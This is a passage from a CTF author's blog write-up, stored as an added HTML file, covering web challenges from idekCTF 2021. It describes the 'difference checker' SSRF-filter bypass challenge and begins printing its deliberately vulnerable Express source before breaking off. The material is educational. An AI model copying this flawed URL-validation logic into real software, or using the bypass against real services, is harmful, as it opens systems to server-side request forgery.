@@ -1,0 +1,815 @@
+<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><meta data-react-helmet="true" name="twitter:description" content="solutions for the web challenges I created for idekCTF 2021 (difference checker, fancy notes, generic pastebin challenge, steghide as a service, and jinjail)"/><meta data-react-helmet="true" name="twitter:title" content="idekCTF 2021 - Author Web Writeups"/><meta data-react-helmet="true" name="twitter:creator" content="_downgrade"/><meta data-react-helmet="true" name="twitter:card" content="summary"/><meta data-react-helmet="true" property="og:type" content="website"/><meta data-react-helmet="true" property="og:description" content="solutions for the web challenges I created for idekCTF 2021 (difference checker, fancy notes, generic pastebin challenge, steghide as a service, and jinjail)"/><meta data-react-helmet="true" property="og:title" content="idekCTF 2021 - Author Web Writeups"/><meta data-react-helmet="true" name="description" content="solutions for the web challenges I created for idekCTF 2021 (difference checker, fancy notes, generic pastebin challenge, steghide as a service, and jinjail)"/><meta name="generator" content="Gatsby 4.17.2"/><style data-href="/styles.7b5f70e6f68e9576981e.css" data-identity="gatsby-global-css">@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:100;src:local("Montserrat Thin "),local("Montserrat-Thin"),url(/static/montserrat-latin-100-8d7d79679b70dbe27172b6460e7a7910.woff2) format("woff2"),url(/static/montserrat-latin-100-ec38980a9e0119a379e2a9b3dbb1901a.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:100;src:local("Montserrat Thin italic"),local("Montserrat-Thinitalic"),url(/static/montserrat-latin-100italic-e279051046ba1286706adc886cf1c96b.woff2) format("woff2"),url(/static/montserrat-latin-100italic-3b325a3173c8207435cd1b76e19bf501.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:200;src:local("Montserrat Extra Light "),local("Montserrat-Extra Light"),url(/static/montserrat-latin-200-9d266fbbfa6cab7009bd56003b1eeb67.woff2) format("woff2"),url(/static/montserrat-latin-200-2d8ba08717110d27122e54c34b8a5798.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:200;src:local("Montserrat Extra Light italic"),local("Montserrat-Extra Lightitalic"),url(/static/montserrat-latin-200italic-6e5b3756583bb2263eb062eae992735e.woff2) format("woff2"),url(/static/montserrat-latin-200italic-a0d6f343e4b536c582926255367a57da.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:300;src:local("Montserrat Light "),local("Montserrat-Light"),url(/static/montserrat-latin-300-00b3e893aab5a8fd632d6342eb72551a.woff2) format("woff2"),url(/static/montserrat-latin-300-ea303695ceab35f17e7d062f30e0173b.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:300;src:local("Montserrat Light italic"),local("Montserrat-Lightitalic"),url(/static/montserrat-latin-300italic-56f34ea368f6aedf89583d444bbcb227.woff2) format("woff2"),url(/static/montserrat-latin-300italic-54b0bf2c8c4c12ffafd803be2466a790.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:400;src:local("Montserrat Regular "),local("Montserrat-Regular"),url(/static/montserrat-latin-400-b71748ae4f80ec8c014def4c5fa8688b.woff2) format("woff2"),url(/static/montserrat-latin-400-0659a9f4e90db5cf51b50d005bff1e41.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:400;src:local("Montserrat Regular italic"),local("Montserrat-Regularitalic"),url(/static/montserrat-latin-400italic-6eed6b4cbb809c6efc7aa7ddad6dbe3e.woff2) format("woff2"),url(/static/montserrat-latin-400italic-7583622cfde30ae49086d18447ab28e7.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:500;src:local("Montserrat Medium "),local("Montserrat-Medium"),url(/static/montserrat-latin-500-091b209546e16313fd4f4fc36090c757.woff2) format("woff2"),url(/static/montserrat-latin-500-edd311588712a96bbf435fad264fff62.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:500;src:local("Montserrat Medium italic"),local("Montserrat-Mediumitalic"),url(/static/montserrat-latin-500italic-c90ced68b46050061d1a41842d6dfb43.woff2) format("woff2"),url(/static/montserrat-latin-500italic-5146cbfe02b1deea5dffea27a5f2f998.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:600;src:local("Montserrat SemiBold "),local("Montserrat-SemiBold"),url(/static/montserrat-latin-600-0480d2f8a71f38db8633b84d8722e0c2.woff2) format("woff2"),url(/static/montserrat-latin-600-b77863a375260a05dd13f86a1cee598f.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:600;src:local("Montserrat SemiBold italic"),local("Montserrat-SemiBolditalic"),url(/static/montserrat-latin-600italic-cf46ffb11f3a60d7df0567f8851a1d00.woff2) format("woff2"),url(/static/montserrat-latin-600italic-c4fcfeeb057724724097167e57bd7801.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:700;src:local("Montserrat Bold "),local("Montserrat-Bold"),url(/static/montserrat-latin-700-7dbcc8a5ea2289d83f657c25b4be6193.woff2) format("woff2"),url(/static/montserrat-latin-700-99271a835e1cae8c76ef8bba99a8cc4e.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:700;src:local("Montserrat Bold italic"),local("Montserrat-Bolditalic"),url(/static/montserrat-latin-700italic-c41ad6bdb4bd504a843d546d0a47958d.woff2) format("woff2"),url(/static/montserrat-latin-700italic-6779372f04095051c62ed36bc1dcc142.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:800;src:local("Montserrat ExtraBold "),local("Montserrat-ExtraBold"),url(/static/montserrat-latin-800-db9a3e0ba7eaea32e5f55328ace6cf23.woff2) format("woff2"),url(/static/montserrat-latin-800-4e3c615967a2360f5db87d2f0fd2456f.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:800;src:local("Montserrat ExtraBold italic"),local("Montserrat-ExtraBolditalic"),url(/static/montserrat-latin-800italic-bf45bfa14805969eda318973947bc42b.woff2) format("woff2"),url(/static/montserrat-latin-800italic-fe82abb0bcede51bf724254878e0c374.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:900;src:local("Montserrat Black "),local("Montserrat-Black"),url(/static/montserrat-latin-900-e66c7edc609e24bacbb705175669d814.woff2) format("woff2"),url(/static/montserrat-latin-900-8211f418baeb8ec880b80ba3c682f957.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:900;src:local("Montserrat Black italic"),local("Montserrat-Blackitalic"),url(/static/montserrat-latin-900italic-4454c775e48152c1a72510ceed3603e2.woff2) format("woff2"),url(/static/montserrat-latin-900italic-efcaa0f6a82ee0640b83a0916e6e8d68.woff) format("woff")}@font-face{font-display:swap;font-family:Merriweather;font-style:normal;font-weight:300;src:local("Merriweather Light "),local("Merriweather-Light"),url(/static/merriweather-latin-300-fc117160c69a8ea0851b26dd14748ee4.woff2) format("woff2"),url(/static/merriweather-latin-300-58b18067ebbd21fda77b67e73c241d3b.woff) format("woff")}@font-face{font-display:swap;font-family:Merriweather;font-style:italic;font-weight:300;src:local("Merriweather Light italic"),local("Merriweather-Lightitalic"),url(/static/merriweather-latin-300italic-fe29961474f8dbf77c0aa7b9a629e4bc.woff2) format("woff2"),url(/static/merriweather-latin-300italic-23c3f1f88683618a4fb8d265d33d383a.woff) format("woff")}@font-face{font-display:swap;font-family:Merriweather;font-style:normal;font-weight:400;src:local("Merriweather Regular "),local("Merriweather-Regular"),url(/static/merriweather-latin-400-d9479e8023bef9cbd9bf8d6eabd6bf36.woff2) format("woff2"),url(/static/merriweather-latin-400-040426f99ff6e00b86506452e0d1f10b.woff) format("woff")}@font-face{font-display:swap;font-family:Merriweather;font-style:italic;font-weight:400;src:local("Merriweather Regular italic"),local("Merriweather-Regularitalic"),url(/static/merriweather-latin-400italic-2de7bfeaf08fb03d4315d49947f062f7.woff2) format("woff2"),url(/static/merriweather-latin-400italic-79db67aca65f5285964ab332bd65f451.woff) format("woff")}@font-face{font-display:swap;font-family:Merriweather;font-style:normal;font-weight:700;src:local("Merriweather Bold "),local("Merriweather-Bold"),url(/static/merriweather-latin-700-4b08e01d805fa35d7bf777f1b24314ae.woff2) format("woff2"),url(/static/merriweather-latin-700-22fb8afba4ab1f093b6ef9e28a9b6e92.woff) format("woff")}@font-face{font-display:swap;font-family:Merriweather;font-style:italic;font-weight:700;src:local("Merriweather Bold italic"),local("Merriweather-Bolditalic"),url(/static/merriweather-latin-700italic-cd92541b177652fffb6e3b952f1c33f1.woff2) format("woff2"),url(/static/merriweather-latin-700italic-f87f3d87cea0dd0979bfc8ac9ea90243.woff) format("woff")}@font-face{font-display:swap;font-family:Merriweather;font-style:normal;font-weight:900;src:local("Merriweather Black "),local("Merriweather-Black"),url(/static/merriweather-latin-900-f813fc6a4bee46eda5224ac7ebf1b7be.woff2) format("woff2"),url(/static/merriweather-latin-900-5d4e42cb44410674acd99153d57df032.woff) format("woff")}@font-face{font-display:swap;font-family:Merriweather;font-style:italic;font-weight:900;src:local("Merriweather Black italic"),local("Merriweather-Blackitalic"),url(/static/merriweather-latin-900italic-b7901d85486871c1779c0e93ddd85656.woff2) format("woff2"),url(/static/merriweather-latin-900italic-9647f9fdab98756989a8a5550eb205c3.woff) format("woff")}
+
+
+/*! normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */html{-webkit-text-size-adjust:100%;line-height:1.15}body{margin:0}main{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}[type=button],[type=reset],[type=submit],button{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type=checkbox],[type=radio]{box-sizing:border-box;padding:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}[hidden]{display:none}:root{--maxWidth-none:"none";--maxWidth-xs:20rem;--maxWidth-sm:24rem;--maxWidth-md:28rem;--maxWidth-lg:32rem;--maxWidth-xl:36rem;--maxWidth-2xl:42rem;--maxWidth-3xl:48rem;--maxWidth-4xl:56rem;--maxWidth-full:"100%";--maxWidth-wrapper:var(--maxWidth-2xl);--spacing-px:"1px";--spacing-0:0;--spacing-1:0.25rem;--spacing-2:0.5rem;--spacing-3:0.75rem;--spacing-4:1rem;--spacing-5:1.25rem;--spacing-6:1.5rem;--spacing-8:2rem;--spacing-10:2.5rem;--spacing-12:3rem;--spacing-16:4rem;--spacing-20:5rem;--spacing-24:6rem;--spacing-32:8rem;--fontFamily-sans:Montserrat,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";--fontFamily-serif:"Merriweather","Georgia",Cambria,"Times New Roman",Times,serif;--font-body:var(--fontFamily-serif);--font-heading:var(--fontFamily-sans);--fontWeight-normal:400;--fontWeight-medium:500;--fontWeight-semibold:600;--fontWeight-bold:700;--fontWeight-extrabold:800;--fontWeight-black:900;--fontSize-root:16px;--lineHeight-none:1;--lineHeight-tight:1.1;--lineHeight-normal:1.5;--lineHeight-relaxed:1.625;--fontSize-0:0.833rem;--fontSize-1:1rem;--fontSize-2:1.2rem;--fontSize-3:1.44rem;--fontSize-4:1.728rem;--fontSize-5:2.074rem;--fontSize-6:2.488rem;--fontSize-7:2.986rem;--color-primary:#8ebfe1;--color-text:#f1f1f1;--color-text-light:#4f5969;--color-heading:#e5f0ff;--color-heading-black:#fbfbfb;--color-accent:#d1dce5}*,:after,:before{box-sizing:border-box}html{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;background-color:#101010;font-size:var(--fontSize-root);line-height:var(--lineHeight-normal)}body{color:var(--color-text);font-family:var(--font-body);font-size:var(--fontSize-1)}footer{padding:var(--spacing-6) var(--spacing-0)}hr{background:var(--color-accent);border:0;height:1px}h1,h2,h3,h4,h5,h6{font-family:var(--font-heading);letter-spacing:-.025em;line-height:var(--lineHeight-tight);margin-bottom:var(--spacing-6);margin-top:var(--spacing-12)}h2,h3,h4,h5,h6{font-weight:var(--fontWeight-bold)}h1,h2,h3,h4,h5,h6{color:var(--color-heading)}h1{font-size:var(--fontSize-6);font-weight:var(--fontWeight-black)}h2{font-size:var(--fontSize-5)}h3{font-size:var(--fontSize-4)}h4{font-size:var(--fontSize-3)}h5{font-size:var(--fontSize-2)}h6{font-size:var(--fontSize-1)}h1>a,h2>a,h3>a,h4>a,h5>a,h6>a{color:inherit;text-decoration:none}p{--baseline-multiplier:0.179;--x-height-multiplier:0.35;line-height:var(--lineHeight-relaxed);margin:var(--spacing-0) var(--spacing-0) var(--spacing-8) var(--spacing-0)}ol,p,ul{padding:var(--spacing-0)}ol,ul{list-style-image:none;list-style-position:outside;margin-bottom:var(--spacing-8);margin-left:var(--spacing-0);margin-right:var(--spacing-0)}ol li,ul li{padding-left:var(--spacing-0)}li>p,ol li,ul li{margin-bottom:calc(var(--spacing-8)/2)}li :last-child{margin-bottom:var(--spacing-0)}li>ul{margin-left:var(--spacing-8);margin-top:calc(var(--spacing-8)/2)}blockquote{border-left:var(--spacing-1) solid var(--color-primary);color:var(--color-text);font-size:var(--fontSize-2);font-style:italic;margin-bottom:var(--spacing-8);margin-left:calc(var(--spacing-6)*-1);margin-right:var(--spacing-8);padding:var(--spacing-0) var(--spacing-0) var(--spacing-0) var(--spacing-6)}blockquote>:last-child{margin-bottom:var(--spacing-0)}blockquote>ol,blockquote>ul{list-style-position:inside}table{border-collapse:collapse;border-spacing:.25rem;margin-bottom:var(--spacing-8);width:100%}table thead tr th{border-bottom:1px solid var(--color-accent)}a{color:var(--color-primary)}a:focus,a:hover{text-decoration:none}.navBarLink{margin:5px}.global-wrapper{margin:var(--spacing-0) auto;max-width:var(--maxWidth-wrapper);padding:var(--spacing-10) var(--spacing-5)}.global-wrapper[data-is-root-path=true] .bio{margin-bottom:var(--spacing-20)}.global-header{margin-bottom:var(--spacing-12)}.main-heading{font-size:var(--fontSize-7);margin:0}.post-list-item{margin-bottom:var(--spacing-8);margin-top:var(--spacing-8)}.post-list-item p{margin-bottom:var(--spacing-0)}.post-list-item h2{color:var(--color-primary);font-size:var(--fontSize-4);margin-bottom:var(--spacing-2);margin-top:var(--spacing-0)}.post-list-item header{margin-bottom:var(--spacing-4)}.header-link-home{font-family:var(--font-heading);font-size:var(--fontSize-2);font-weight:var(--fontWeight-bold);text-decoration:none}.bio{display:flex;margin-bottom:var(--spacing-16)}.bio p,.bio-avatar{margin-bottom:var(--spacing-0)}.bio-avatar{border-radius:100%;margin-right:var(--spacing-4);min-width:50px}.blog-post header h1{margin:var(--spacing-0) var(--spacing-0) var(--spacing-4) var(--spacing-0)}.blog-post header p{font-family:var(--font-heading);font-size:var(--fontSize-2)}.blog-post-nav ul{margin:var(--spacing-0)}.gatsby-highlight{margin-bottom:var(--spacing-8)}@media (max-width:42rem){blockquote{margin-left:var(--spacing-0);padding:var(--spacing-0) var(--spacing-0) var(--spacing-0) var(--spacing-4)}ol,ul{list-style-position:inside}}code[class*=language-],pre[class*=language-]{word-wrap:normal;background:0 0;color:#fff;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;-webkit-hyphens:none;hyphens:none;line-height:1.5;-o-tab-size:4;tab-size:4;text-align:left;text-shadow:0 -.1em .2em #000;white-space:pre;word-break:normal;word-spacing:normal}:not(pre)>code[class*=language-],pre[class*=language-]{background:#141414}pre[class*=language-]{border:.3em solid #545454;border-radius:.5em;box-shadow:inset 1px 1px .5em #000;margin:.5em 0;overflow:auto;padding:1em}pre[class*=language-]::selection{background:#27292a}code[class*=language-] ::selection,code[class*=language-]::selection,pre[class*=language-] ::selection,pre[class*=language-]::selection{background:hsla(0,0%,93%,.15);text-shadow:none}:not(pre)>code[class*=language-]{border:.13em solid #545454;border-radius:.3em;box-shadow:inset 1px 1px .3em -.1em #000;padding:.15em .2em .05em;white-space:normal}.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#777}.token.namespace,.token.punctuation{opacity:.7}.token.boolean,.token.deleted,.token.number,.token.tag{color:#ce6849}.token.builtin,.token.constant,.token.keyword,.token.property,.token.selector,.token.symbol{color:#f9ed99}.language-css .token.string,.style .token.string,.token.attr-name,.token.attr-value,.token.char,.token.entity,.token.inserted,.token.operator,.token.string,.token.url,.token.variable{color:#909e6a}.token.atrule{color:#7385a5}.token.important,.token.regex{color:#e8c062}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.language-markup .token.attr-name,.language-markup .token.punctuation,.language-markup .token.tag{color:#ac885c}.token{position:relative;z-index:1}.line-highlight.line-highlight{background:hsla(0,0%,33%,.25);background:linear-gradient(90deg,hsla(0,0%,33%,.1) 70%,hsla(0,0%,33%,0));border-bottom:1px dashed #545454;border-top:1px dashed #545454;margin-top:.75em;z-index:0}.line-highlight.line-highlight:before,.line-highlight.line-highlight[data-end]:after{background-color:#8693a6;color:#f4f1ef}</style><style>.gatsby-image-wrapper{position:relative;overflow:hidden}.gatsby-image-wrapper picture.object-fit-polyfill{position:static!important}.gatsby-image-wrapper img{bottom:0;height:100%;left:0;margin:0;max-width:none;padding:0;position:absolute;right:0;top:0;width:100%;object-fit:cover}.gatsby-image-wrapper [data-main-image]{opacity:0;transform:translateZ(0);transition:opacity .25s linear;will-change:opacity}.gatsby-image-wrapper-constrained{display:inline-block;vertical-align:top}</style><noscript><style>.gatsby-image-wrapper noscript [data-main-image]{opacity:1!important}.gatsby-image-wrapper [data-placeholder-image]{opacity:0!important}</style></noscript><script type="module">const e="undefined"!=typeof HTMLImageElement&&"loading"in HTMLImageElement.prototype;e&&document.body.addEventListener("load",(function(e){const t=e.target;if(void 0===t.dataset.mainImage)return;if(void 0===t.dataset.gatsbyImageSsr)return;let a=null,n=t;for(;null===a&&n;)void 0!==n.parentNode.dataset.gatsbyImageWrapper&&(a=n.parentNode),n=n.parentNode;const o=a.querySelector("[data-placeholder-image]"),r=new Image;r.src=t.currentSrc,r.decode().catch((()=>{})).then((()=>{t.style.opacity=1,o&&(o.style.opacity=0,o.style.transition="opacity 500ms linear")}))}),!0);</script><style type="text/css">
+    .anchor.before {
+      position: absolute;
+      top: 0;
+      left: 0;
+      transform: translateX(-100%);
+      padding-right: 4px;
+    }
+    .anchor.after {
+      display: inline-block;
+      padding-left: 4px;
+    }
+    h1 .anchor svg,
+    h2 .anchor svg,
+    h3 .anchor svg,
+    h4 .anchor svg,
+    h5 .anchor svg,
+    h6 .anchor svg {
+      visibility: hidden;
+    }
+    h1:hover .anchor svg,
+    h2:hover .anchor svg,
+    h3:hover .anchor svg,
+    h4:hover .anchor svg,
+    h5:hover .anchor svg,
+    h6:hover .anchor svg,
+    h1 .anchor:focus svg,
+    h2 .anchor:focus svg,
+    h3 .anchor:focus svg,
+    h4 .anchor:focus svg,
+    h5 .anchor:focus svg,
+    h6 .anchor:focus svg {
+      visibility: visible;
+    }
+  </style><script>
+    document.addEventListener("DOMContentLoaded", function(event) {
+      var hash = window.decodeURI(location.hash.replace('#', ''))
+      if (hash !== '') {
+        var element = document.getElementById(hash)
+        if (element) {
+          var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop
+          var clientTop = document.documentElement.clientTop || document.body.clientTop || 0
+          var offset = element.getBoundingClientRect().top + scrollTop - clientTop
+          // Wait for the browser to finish rendering before scrolling.
+          setTimeout((function() {
+            window.scrollTo(0, offset - 0)
+          }), 0)
+        }
+      }
+    })
+  </script><link rel="alternate" type="application/rss+xml" title="Gatsby Starter Blog RSS Feed" href="/rss.xml"/><link rel="icon" href="/favicon-32x32.png?v=4a9773549091c227cd2eb82ccd9c5e3a" type="image/png"/><link rel="manifest" href="/manifest.webmanifest" crossorigin="anonymous"/><link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=4a9773549091c227cd2eb82ccd9c5e3a"/><link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=4a9773549091c227cd2eb82ccd9c5e3a"/><link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=4a9773549091c227cd2eb82ccd9c5e3a"/><link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=4a9773549091c227cd2eb82ccd9c5e3a"/><link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=4a9773549091c227cd2eb82ccd9c5e3a"/><link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=4a9773549091c227cd2eb82ccd9c5e3a"/><link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=4a9773549091c227cd2eb82ccd9c5e3a"/><link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=4a9773549091c227cd2eb82ccd9c5e3a"/><title data-react-helmet="true">idekCTF 2021 - Author Web Writeups | downgrade</title></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><div class="global-wrapper" data-is-root-path="false"><header class="global-header"><nav><div classname="navbar"><a class="navBarLink" href="/">Home</a><a class="navBarLink" href="/about">About</a></div></nav></header><main><article class="blog-post" itemscope="" itemType="http://schema.org/Article"><header><h1 itemProp="headline">idekCTF 2021 - Author Web Writeups</h1><p>December 13, 2021</p></header><section itemProp="articleBody"><p>I created 5 web challenges for <a href="https://ctftime.org/event/1512">idekCTF 2021</a> with the intention of exposing players to interesting concepts/techniques that they may not be aware of. I think I accomplished this goal as feedback was pretty well received.</p>
+<p>All challenges are publicly available on my <a href="https://github.com/downgraded/ctf-challenges/tree/master/idekCTF-2021/web">github</a>.</p>
+<p>Overall, I think our event was a huge success and I’m super excited to continue hosting in the years to come!</p>
+<hr>
+<h1 id="difference-checker" style="position:relative;"><a href="#difference-checker" aria-label="difference checker permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>difference checker</h1>
+<p>This was the easiest of my challenges and was based around bypassing an <a href="https://www.npmjs.com/package/ssrf-req-filter">ssrf filter</a>. The filter will abort any request that makes its way to localhost. The vulnerability was not in this module, but in the application logic.</p>
+<p>The app is very straightforward. It will take two links, validates that the links do not point to localhost, and then returns a diff of the two pages.</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 520px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/d436cf84a0430533b0246929a27609bb/69902/index.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 37.9746835443038%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAvUlEQVQY06WPwQ6CMAyGef93MhAVoz6AmHiRG65rZcpA1nUacSYGYzj4ZYf1b76mTe5/kIzqIIJaH8sSAJSCpmmIqDam7/tpmV2/yvNZmu2L3Xyx3G7Web5K0wzp/Bwdwk9ZREbtuM7AhHwxBgCI6HRSw9oKEZGoqioApbV2zo1l/4VI8N4z8ygVEefY2lYkRPl6bQBAv0C0tmXmrrsNIQJoAI1Itm2993VtiuLgHEc5ROJHJL53cv9sfZ79AAVT0OePx0RFAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="index"
+        title="index"
+        src="/static/d436cf84a0430533b0246929a27609bb/69902/index.png"
+        srcset="/static/d436cf84a0430533b0246929a27609bb/c26ae/index.png 158w,
+/static/d436cf84a0430533b0246929a27609bb/6bdcf/index.png 315w,
+/static/d436cf84a0430533b0246929a27609bb/69902/index.png 520w"
+        sizes="(max-width: 520px) 100vw, 520px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+  </a>
+    </span></p>
+<div class="gatsby-highlight" data-language="js"><pre class="language-js"><code class="language-js"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> ssrfFilter <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ssrf-req-filter'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> fetch <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node-fetch'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> Diff <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'diff'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> hbs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-handlebars'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> port <span class="token operator">=</span> <span class="token number">1337</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> flag <span class="token operator">=</span> <span class="token string">'idek{REDACTED}'</span><span class="token punctuation">;</span>
+
+
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'hbs'</span><span class="token punctuation">,</span> hbs<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+    <span class="token literal-property property">defaultLayout</span><span class="token operator">:</span> <span class="token string">'main'</span><span class="token punctuation">,</span>
+    <span class="token literal-property property">extname</span><span class="token operator">:</span> <span class="token string">'.hbs'</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'hbs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">validifyURL</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        valid <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token literal-property property">agent</span><span class="token operator">:</span> <span class="token function">ssrfFilter</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">response</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> <span class="token boolean">true</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span>
